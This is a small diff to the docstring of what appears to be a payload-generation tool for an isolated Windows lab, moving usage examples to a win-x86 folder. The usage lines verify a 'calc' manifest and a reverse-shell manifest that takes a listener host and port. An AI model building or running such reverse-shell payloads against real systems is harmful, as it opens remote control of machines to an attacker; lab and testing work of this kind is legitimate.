@@ -12,8 +12,8 @@ Assembly requires Keystone or NASM.
 Execution is manual, in the isolated Windows lab environment only.
 
 Usage:
-  uv run python -m emitrion.verify emitrion/manifests/calc.yaml --template ir_run_command
-  uv run python -m emitrion.verify emitrion/manifests/revshell.yaml --lhost 10.0.0.1 --lport 9001
+  uv run python -m emitrion.verify emitrion/manifests/win-x86/calc.yaml --template ir_run_command
+  uv run python -m emitrion.verify emitrion/manifests/win-x86/revshell.yaml --lhost 10.0.0.1 --lport 9001
 """
 from __future__ import annotations
 
